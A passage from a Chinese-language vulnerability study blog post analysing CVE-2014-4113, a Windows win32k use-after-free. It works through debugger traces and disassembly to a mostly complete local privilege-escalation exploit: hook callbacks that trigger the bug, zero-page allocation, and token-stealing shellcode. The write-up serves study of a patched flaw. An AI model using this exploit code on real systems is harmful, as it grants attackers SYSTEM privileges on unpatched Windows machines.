= tagpopupmenu;</div><div class="line">   <span class="built_in"> return </span>v6;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxSendMessage</code>最终调用<code>xxxSendMessageTimeout</code>函数，在<code>xxxSendMessageTimeout</code>中，首先判断发送窗口是否属于当前进程，以及判断是否处于Hook状态，并最终调用<code>win32k!xxxMenuWindowProc</code>。<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kd&gt; dt <span class="keyword">tag</span>WND fe810650</div><div class="line">win32k!<span class="keyword">tag</span>WND</div><div class="line">   +<span class="number">0</span>x000 head             : _THRDESKHEAD</div><div class="line">   +<span class="number">0</span>x014 <span class="keyword">state</span>            : <span class="number">0</span>x40000</div><div class="line">[...]</div><div class="line">   +<span class="number">0</span>x050 rcClient         : <span class="keyword">tag</span>RECT</div><div class="line">   +<span class="number">0</span>x060 lpfnWndProc      : <span class="number">0</span>x95abdd97     long  win32k!xxxMenuWindowProc+<span class="number">0</span></div><div class="line">[...]</div><div class="line">kd&gt; kn</div><div class="line"> <span class="comment"># ChildEBP RetAddr      </span></div><div class="line"><span class="number">00</span> <span class="number">991</span>c0940 <span class="number">95</span>a44859     win32k!xxxMenuWindowProc</div><div class="line"><span class="number">01</span> <span class="number">991</span>c0980 <span class="number">95</span>a446a4     win32k!xxxSendMessageTimeout+<span class="number">0</span>x1ac</div><div class="line"><span class="number">02</span> <span class="number">991</span>c09a8 <span class="number">959</span>cb88b     win32k!xxxSendMessage+<span class="number">0</span>x28</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMenuWindowProc</code>首先检查了窗口对象的状态，然后根据message执行不同的操作。当message为MN_FINDMENUWINDOWFROMPOINT时，继续将弹出窗口ppopupmenu传入xxxMNFindWindowFromPoint，并最终返回窗口对象。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">case MN_FINDMENUWINDOWFROMPOINT:</div><div class="line">&#123;</div><div class="line">    /*</div><div class="line">     * lParam <span class="keyword">is</span> point <span class="keyword">to</span> search <span class="keyword">for</span> <span class="keyword">from</span> this hierarchy down.</div><div class="line">     * returns MFMWFP_* value <span class="keyword">or</span> a pwnd.</div><div class="line">     */</div><div class="line">    lRet = xxxMNFindWindowFromPoint(ppopupmenu, (PUINT)wParam, MAKEPOINTS(lParam));</div><div class="line">    /*</div><div class="line">     * Convert <span class="literal">return</span> value <span class="keyword">to</span> a handle.</div><div class="line">     */</div><div class="line">    <span class="keyword">if</span> (IsMFMWFPWindow(lRet)) &#123;</div><div class="line"><span class="built_in">        return</span> (LRESULT)HW((PWND)lRet);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">        return</span> lRet;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为<code>spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup;</code>不为空，所以在构造poc的时候需要创建两个菜单对象，新构造的poc如下<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Step1:注册窗口类和创建窗口</span></div><div class="line">ATOM reg = RegisterClassA(&amp;wnd_class);</div><div class="line">HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL);</div><div class="line"><span class="comment">//Step2:创建第一个菜单</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line">TrackPopupMenu(MenuOne,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div><div class="line"><span class="comment">//Step3：创建第二个菜单</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//Step4：触发漏洞</span></div><div class="line">TrackPopupMenu(MenuTwo,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后，进入<code>win32k!xxxSendMessageTimeout</code>,【在挖一个坑，学习xxxSendMessageTimeout机制】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>win32k!xxxSendMessageTimeout</code>中调用<code>xxxSendMessageToClient</code>向用户侧发送MN_FINDMENUWINDOWFROMPOINT消息，此时执行流会回调到用户层，从而给了机会销毁菜单对象，从而有了触发漏洞前提。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要想执行流执行<code>xxxSendMessageToClient</code>，需要满足一下几个条件：</p><ul><li>pwnd != -1 (已满足）</li><li>gptiCurrent == pwnd-&gt;head.pti（判断发送的窗口是否属于当前线程）(已满足)</li><li>gptiCurrent-&gt;fsHooks（使用SetWindowsHookEx即可满足）</li><li>ptagWND-&gt;bServerSideWindowProc（满足）</li><li>在0x1EB消息发送后修改快捷菜单的窗口过程(ptagwnd-&gt;lpfnWndProc)（使用SetWindowLongPtr可以满足）</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;继续构造新的poc。使用SetWindowsHookEx添加一个钩子过程。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Step1:注册窗口类和创建窗口</span></div><div class="line">ATOM reg = RegisterClassA(&amp;wnd_class);</div><div class="line">HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL);</div><div class="line"><span class="comment">//Step2:创建第一个菜单</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line">TrackPopupMenu(MenuOne,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div><div class="line"><span class="comment">//Step3：创建第二个菜单</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//Step5：触发漏洞</span></div><div class="line">TrackPopupMenu(MenuTwo,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;编写钩子处理函数，根据上面分析，<code>xxxMNFindWindowFromPoint</code>调用 <code>xxxSendMessage</code>发送<code>MN_FINDMENUWINDOWFROMPOINT</code>(0x1EB)消息，用来查找菜单窗口对象。所以我们需要钩取<code>MN_FINDMENUWINDOWFROMPOINT</code>消息。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK HookCallback(<span class="keyword">int</span> code, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>) &#123;</div><div class="line">printf(<span class="string">"Callback one called.\n"</span>)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> (*(DWORD*)(<span class="keyword">lParam</span> + <span class="number">8</span>) == MN_FINDMENUWINDOWFROMPOINT) </div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) </div><div class="line">&#123;</div><div class="line">SetWindowLongA(*(<span class="keyword">HWND</span>*)(<span class="keyword">lParam</span> + <span class="number">12</span>), GWLP_WNDPROC, (LONG)HookCallbackTwo)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;钩子函数原型如下，<code>nCode</code>可以指定挂钩函数是否必须处理消息，<code>wParam</code>表示消息是否可以由当前线程发送，<code>lparam</code>指向的是tagCWPSTRUCT结构体指针。tagCWPSTRUCT结构体第3个成员表示消息类型。可以根据<code>*(DWORD*)(lParam + 8)</code>的值判断消息是否是<code>MN_FINDMENUWINDOWFROMPOINT</code>。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK CallWndProc(</div><div class="line">  _In_ <span class="keyword">int</span>    nCode,</div><div class="line">  _In_ <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>,</div><div class="line">  _In_ <span class="keyword">LPARAM</span> <span class="keyword">lParam</span></div><div class="line">)<span class="comment">;</span></div><div class="line">typedef struct tagCWPSTRUCT &#123;</div><div class="line">  <span class="keyword">LPARAM</span> <span class="keyword">lParam</span><span class="comment">;</span></div><div class="line">  <span class="keyword">WPARAM</span> <span class="keyword">wParam</span><span class="comment">;</span></div><div class="line">  UINT   message<span class="comment">;</span></div><div class="line">  <span class="keyword">HWND</span>   <span class="keyword">hwnd</span><span class="comment">;</span></div><div class="line">&#125; CWPSTRUCT, *PCWPSTRUCT, *NPCWPSTRUCT, *LPCWPSTRUCT<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在窗口钩子的处理函数中，如果处理的消息为<code>MN_FINDMENUWINDOWFROMPOINT</code>,就会调用<code>SetWindowLongA</code>修改菜单的消息处理函数，为什么要这样呢？我理解的是，当使用SetWindowsHook设置的是针对窗口的钩子函数，所以还需要通过<code>SetWindowLongA</code>为菜单对象设置钩子函数。<code>hWnd</code>是指窗口句柄。<code>nIndex</code>是指偏移，选择<code>GWL_WNDPROC</code>为窗口函数设置一个新地址。<code>dwNewLong</code>在这里指的是函数地址。<code>HookCallbackTwo</code>是针对菜单对象的处理函数，在这个函数中需要释放菜单，并且返回-5。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">LONG SetWindowLongA(</div><div class="line">  [in] <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,</div><div class="line">  [in] <span class="keyword">int</span>  nIndex,</div><div class="line">  [in] LONG dwNewLong</div><div class="line">)<span class="comment">;</span></div><div class="line"><span class="comment">//针对菜单对象的处理函数</span></div><div class="line">LRESULT CALLBACK HookCallbackTwo(<span class="keyword">HWND</span> <span class="keyword">hWnd</span>, UINT Msg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"Callback two called.\n"</span>)<span class="comment">;</span></div><div class="line">EndMenu()<span class="comment">;</span></div><div class="line"><span class="keyword">return</span> <span class="number">-5</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然,当菜单钩子函数返回值为-5的时候，<code>win32k!xxxMNFindWindowFromPoint</code>的返回值为<code>0xfffffffb</code>,由此造成UAF。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">95ab7b52 89460c         <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">eax</span></div><div class="line">95ab7b55 <span class="number">53</span>             <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line">95ab7b56 8d4510         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">10h</span>]</div><div class="line">95ab7b59 <span class="number">50</span>             <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">95ab7b5a <span class="number">57</span>             <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">95ab7b5b e88596ffff     <span class="keyword">call</span>    win32k!xxxMNFindWindowFromPoint (95ab11e5)</div><div class="line">95ab7b60 8bd8           <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="built_in">eax</span></div><div class="line">kd&gt; g</div><div class="line">Breakpoint <span class="number">1</span> hit</div><div class="line">win32k!xxxHandleMenuMessages+<span class="number">0x9e</span>:</div><div class="line">95ab7b60 8bd8            <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">eax</span></div><div class="line">kd&gt; r <span class="built_in">eax</span></div><div class="line"><span class="built_in">eax</span>=fffffffb</div></pre></td></tr></table></figure></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上一节介绍了，CVE-2014-4113最终是在<code>win32k!xxxSendMessageTimeout+0xb3</code>crash。我们再来分析一下，首先<code>int __stdcall xxxSendMessageTimeout(tagWND *pwnd, UINT message, WPARAM wParam, LPARAM lParam, UINT fuFlags, UINT uTimeout, PLONG_PTR lpdwResult)</code>的<code>*pwnd</code>是可控的，在CVE-2014-4113这个漏洞中，该值为0xFFFFFFFB.当执行流执行到0x95A44856的时候，此时esi为0xFFFFFFFB，则<code>[esi+60] = [0xFFFFFFFB + 0x60] = 0x5B</code>即会调用地址为0x5B这个地址的函数。<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nt!RtlpBreakWithStatusInstruction:</div><div class="line"><span class="number">83e6</span>d394 cc              int     <span class="number">3</span></div><div class="line">kd&gt; G</div><div class="line">Access violation - code c0000005 (!!! second chance !!!)</div><div class="line">win32k!xxxSendMessageTimeout+<span class="number">0</span>xb3:</div><div class="line"><span class="number">94</span>a54760 <span class="number">3</span>b7e08          cmp     edi,dword ptr [esi+<span class="number">8</span>]</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>95A446C1 loc_95A446C1:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+F↑j</span></div><div class="line"><span class="symbol">.text:</span>95A446C1                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+pwnd] <span class="comment">; CVE-2014-4113 esi = 0xFFFFFFFB</span></div><div class="line"><span class="symbol">.text:</span>95A446C4                 <span class="keyword">cmp</span>     <span class="built_in">esi</span>, <span class="number">0FFFFFFFFh</span></div><div class="line"><span class="symbol">.text:</span>95A446C7                 <span class="keyword">jnz</span>     short loc_95A44700</div><div class="line">[...]</div><div class="line"><span class="symbol">.text:</span>95A4484E loc_95A4484E:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+198↑j</span></div><div class="line"><span class="symbol">.text:</span>95A4484E                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+lParam]</div><div class="line"><span class="symbol">.text:</span>95A44851                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+wParam]</div><div class="line"><span class="symbol">.text:</span>95A44854                 <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line"><span class="symbol">.text:</span>95A44855                 <span class="keyword">push</span>    <span class="built_in">esi</span></div><div class="line"><span class="symbol">.text:</span>95A44856                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">60h</span>] <span class="comment">; [esi+60] = [0xFFFFFFFB + 0x60] = 0x5B</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述分析，要想执行流执行到0x95A44856，需要满足两个条件，内存地址为3的地址存放的是当前线程信息。gptiCurrent是一个全局变量，其指向的是tagTHREADINFO结构，也就是线程环境块偏移0x40的Win32ThreadInfo结构。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">.<span class="string">text:</span><span class="number">95</span>A4475A                 mov     edi, _gptiCurrent</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44760                 cmp     edi, [esi+<span class="number">8</span>]    ; [esi+<span class="number">8</span>] = [<span class="number">0xFFFFFFFB</span> +<span class="number">8</span> ] = <span class="number">0x3</span></div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44763                 jz      loc_95A447ED</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44769                 mov     ecx, [esi]</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A4476B                 mov     edx, dword_95B9C0E4</div><div class="line">kd&gt; dt _teb</div><div class="line">nt!_TEB</div><div class="line">+<span class="number">0x000</span> <span class="string">NtTib :</span> _NT_TIB</div><div class="line">+<span class="number">0x01c</span> <span class="string">EnvironmentPointer :</span> Ptr32 Void</div><div class="line">+<span class="number">0x020</span> <span class="string">ClientId :</span> _CLIENT_ID ：当前进程ID</div><div class="line">+<span class="number">0x028</span> <span class="string">ActiveRpcHandle :</span> Ptr32 Void</div><div class="line">+<span class="number">0x02c</span> <span class="string">ThreadLocalStoragePointer :</span> Ptr32 Void</div><div class="line">+<span class="number">0x030</span> <span class="string">ProcessEnvironmentBlock :</span> Ptr32 _PEB 当前进程的PEB指针</div><div class="line">+<span class="number">0x034</span> <span class="string">LastErrorValue :</span> Uint4B</div><div class="line">+<span class="number">0x038</span> <span class="string">CountOfOwnedCriticalSections :</span> Uint4B</div><div class="line">+<span class="number">0x03c</span> <span class="string">CsrClientThread :</span> Ptr32 Void</div><div class="line">+<span class="number">0x040</span> <span class="string">Win32ThreadInfo :</span> Ptr32 Void</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二，地址为4的内存的值为4<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>95A44826 loc_95A44826:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+151↑j</span></div><div class="line"><span class="symbol">.text:</span>95A44826                 <span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">16h</span>], <span class="number">4</span> <span class="comment">; [esi+8] = [0xFFFFFFFB +16] = 0x11</span></div><div class="line"><span class="symbol">.text:</span>95A4482A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+HighLimit]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述描述，最终通过<code>call    dword ptr [esi+60h]</code>执行shellcode，所以我们需要在<code>0x5B</code>处提前设置Shllcode的地址。在《Windows核心编程》关于内存结构的章节中指出：Windows系统存在空指针赋值分区，其范围从0x00000000至0x0000FFFF，由于这部分内存位于地址空间的最开始，因此也称之为零页内存。可以通过<code>NtAllocateVirtualMemory</code>分配内存空间，对于Windows系统，在进程的虚拟空间申请一块内存时，该块内存默认为64KB大小对齐（分配内存的起始地址必须为64KB的整数倍），因此，当我们设置分配内存的起始地址为0x00000100时，系统会强制决定起始地址为0x00000000，由于我们分配页面大小选择4KB，因此分配得到的内存空间为0x00000000~0x00001FFF。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">BOOL AllocateZeroPage()</div><div class="line">&#123;</div><div class="line">pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtAllocateVirtualMemory"</span>);</div><div class="line">if (NULL == NtAllocateVirtualMemory)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] Get NtAllocateVirtualMemory Error<span class="subst">\n</span>"</span>);</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] NtAllocateVirtualMemory Address is :0x%p <span class="subst">\n</span>"</span>, NtAllocateVirtualMemory);</div><div class="line"><span class="comment">//https://www.anquanke.com/post/id/241057</span></div><div class="line">NTSTATUS ntStatus = <span class="number">0</span>;</div><div class="line">PVOID BaseAddress = (PVOID)<span class="number">0x100</span>;   <span class="comment">//虽然将baseaddr设置为0x100，系统会强制将起始地址设置为0x00000000</span></div><div class="line">SIZE_T RegionSize = <span class="number">0x1000</span>;</div><div class="line">ntStatus = NtAllocateVirtualMemory((HANDLE)<span class="number">0xFFFFFFFF</span>,</div><div class="line">&amp;BaseAddress,</div><div class="line"><span class="number">0</span>,</div><div class="line">&amp;RegionSize,</div><div class="line">MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,</div><div class="line">PAGE_EXECUTE_READWRITE);</div><div class="line">if (ntStatus != <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]Execuate NtAllocateVirtualMemory Error<span class="subst">\n</span>"</span>);</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//getchar();</span></div><div class="line">return <span class="literal">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了能执行到漏洞利用处，需要满足上面两个条件,并设置shellcode地址。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x03) = (<span class="name">DWORD</span>)GetPtiCurrent()<span class="comment">;</span></div><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x11) = (<span class="name">DWORD</span>)<span class="number">4</span><span class="comment">;</span></div><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x5B) = (<span class="name">DWORD</span>)&amp;ShellCode<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造Shellcode函数值得注意的是，首先Shellcode函数的函数原型必须和<code>result = pwnd-&gt;lpfnWndProc(pwnd, message_1, wParam, lParam);</code>保持一致。而且尽量让编译器进行堆栈的平衡。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span>  __stdcall ShellCode(<span class="keyword">int</span> parameter1, <span class="keyword">int</span> parameter2, <span class="keyword">int</span> parameter3, <span class="keyword">int</span> parameter4)</div><div class="line">&#123;</div><div class="line">_asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">pushad</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">fs</span>:[<span class="built_in">eax</span> + KTHREAD_OFFSET]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + EPROCESS_OFFSET]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, SYSTEM_PID<span class="comment">;</span></div><div class="line"><span class="symbol">SearchSystemPID:</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + FLINK_OFFSET]</div><div class="line"><span class="keyword">sub</span> <span class="built_in">eax</span>, FLINK_OFFSET</div><div class="line"><span class="keyword">cmp</span>[<span class="built_in">eax</span> + PID_OFFSET], <span class="built_in">edx</span><span class="comment">;</span></div><div class="line"><span class="keyword">jne</span> SearchSystemPID</div><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">eax</span> + TOKEN_OFFSET]</div><div class="line"><span class="keyword">mov</span>[<span class="built_in">ecx</span> + TOKEN_OFFSET], <span class="built_in">edx</span></div><div class="line"><span class="keyword">popad</span></div><div class="line">&#125;</div><div class="line">return <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x04-参考文献"><a href="#0x04-参考文献" class="headerlink" title="0x04 参考文献"></a>0x04 参考文献</h2><ul><li>[1] <a href="https://b2ahex.github.io/blog/2017/06/13/4113分析/index.html" target="_blank" rel="external">CVE-2014-4113 漏洞利用分析</a> : 主要的poc构建框架</li><li>[2] <a href="https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/exploit.cpp" target="_blank" rel="external">https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/exploit.cpp</a> : CVE-2014-4113的exp</li><li>[3] <a href="https://bbs.pediy.com/thread-271809.htm" target="_blank" rel="external">CVE-2014-4113提权漏洞学习笔记</a> : 详细的分析笔记</li><li>[4] <a href="https://www.anquanke.com/post/id/84869" target="_blank" rel="external">[技术分享]经典内核漏洞调试笔记</a></li><li>以及小刀师傅的详细解答</li></ul>]]></content>
    
    <summary type="html">
    
